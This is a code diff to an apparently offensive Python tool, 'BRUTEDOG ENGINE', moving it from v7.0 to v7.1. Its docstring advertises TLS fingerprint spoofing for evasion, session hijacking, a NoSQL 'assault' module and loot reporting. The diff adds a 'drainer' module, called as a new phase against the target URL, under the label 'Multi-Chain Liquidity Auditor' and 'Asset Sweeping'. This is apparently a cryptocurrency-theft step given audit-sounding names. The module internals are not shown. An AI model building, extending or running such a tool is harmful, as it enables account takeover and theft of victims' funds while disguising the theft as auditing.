@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG ENGINE v7.0 — State-Machine Logic & High-Aggression Exploitation Engine
+BRUTEDOG ENGINE v7.1 — State-Machine Logic & High-Aggression Exploitation Engine
 Features:
 - Integrated with centralized SecureTransport middleware (TLS 1.2/1.3 JA3/4 spoofing & Poisson behavioral jitter)
 - Stateful intelligence ingestion from v7.0 crawler state-machine graph & DOM sink inspector
@@ -8,7 +8,7 @@ Features:
 - Live autonomous test-account session propagation across exploit modules
 - Persistent Session Pool & Response Fingerprinter integration for false-positive elimination
 - HTTP/2 single-packet concurrency engine integration for race condition logic fuzzing
-- Live on-screen login verification and session injection feedback with automatic HTML loot reporting
+- Active Multi-Chain Liquidity Auditor & Transaction Signer/Broadcaster integration
 - Zero-disk in-memory intelligence collection & live telemetry streaming
 """
 import asyncio
@@ -29,6 +29,7 @@ from modules.db_assault import run_nosql_assault
 from modules.session_hijack import run_session_hijack
 from modules.race_condition import run_race_condition_test
 from modules.live_login_verifier import execute_live_login_verification
+from modules.drainer import run_drainer_engine
 from modules.telemetry import stream_proof
 
 # ============================================================
@@ -286,7 +287,7 @@ def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None, f
 # ENGINE ORCHESTRATOR
 # ============================================================
 async def run_autonomous_engine(target_host=None, credentials_list=None, options=None):
-    section("BRUTEDOG STATE-MACHINE LOGIC EXPLOITATION ENGINE v7.0")
+    section("BRUTEDOG STATE-MACHINE LOGIC EXPLOITATION ENGINE v7.1")
     try:
         if target_host:
             target_url = target_host.strip()
@@ -415,6 +416,12 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         )
     except Exception as exc:
         error(f"Race condition module failed: {exc}")
+
+    # Phase 4: Multi-Chain Liquidity Auditor & Asset Sweeping Integration
+    try:
+        await run_drainer_engine(target_url)
+    except Exception as exc:
+        error(f"Drainer / liquidity audit engine failed: {exc}")
             
     duration = round(time.monotonic() - start, 2)
     
